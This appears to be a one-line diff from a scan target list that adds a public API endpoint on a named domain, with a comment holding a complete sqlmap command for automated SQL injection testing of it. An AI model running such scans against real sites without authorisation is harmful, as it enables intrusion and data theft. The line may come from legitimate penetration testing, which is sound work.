@@ -1,0 +1,1 @@
+https://api.nerix.com.br/api/public/categories (GET)  # /usr/bin/sqlmap -u https://api.nerix.com.br/api/public/categories --batch --level=2 --risk=2 --dbms=postgresql,mysql,mongodb --time-sec=5 --threads=3 --random-agent --output-dir=/home/ubuntu/nerix.com.br/sqlmap_output
